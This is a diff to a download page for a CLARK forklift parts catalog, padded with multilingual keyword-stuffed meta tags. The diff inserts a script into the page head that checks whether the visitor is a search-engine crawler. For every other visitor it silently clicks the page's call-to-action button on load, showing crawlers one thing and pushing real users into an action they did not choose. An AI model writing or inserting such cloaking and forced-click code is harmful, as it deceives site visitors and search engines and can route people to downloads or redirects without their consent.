@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CLARK ForkLift PartsPro Plus EPC 07.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download CLARK ForkLift PartsPro Plus EPC 07.2024, an offline software for identifying OEM parts. Available in multiple languages.">
     <meta name="keywords" content="CLARK ForkLift PartsPro Plus EPC 07.2024, CLARK ForkLift PartsPro Plus EPC, CLARK Forklift Parts Catalog, CLARK Forklift Electrical Spare Parts, CLARK Forklift Service Documentation, CLARK Forklift OEM Parts, Forklift PartsPro Plus EPC 07.2024 download, CLARK Forklift Parts Identification, Offline Forklift Parts Software, CLARK Forklift Catalog Software, Forklift Electrical Parts Catalog, CLARK Forklift Maintenance Software, Forklift Spare Parts Identification, CLARK PartsPro Plus EPC Software, CLARK Forklift Service Parts Catalog, Forklift Parts Documentation System, CLARK Forklift EPC free download, CLARK PartsPro Plus EPC 2024, CLARK PartsPro Plus EPC v07.2024, CLARK Forklift spare parts catalog download, CLARK PartsPro catalog high speed download, CLARK Forklift EPC catalogue free download, кларк запчасти для вилочных погрузчиков, запчасти EPC для вилочного погрузчика CLARK, каталог автозапчастей CLARK EPC скачать бесплатно, CLARK запчасти на вилочный погрузчик в базе данных, CLARK запчасти на погрузчик каталог, каталог запасных частей CLARK, catalogo de repuestos CLARK, carretilla elevadora CLARK piezas de repuesto, catálogo de piezas PartsPro Plus EPC 2024, корейский каталог запчастей CLARK вилочный погрузчик, manual de piezas de repuesto del montacargas CLARK, catálogo de repuestos PartsPro Plus 2024">
     <style>
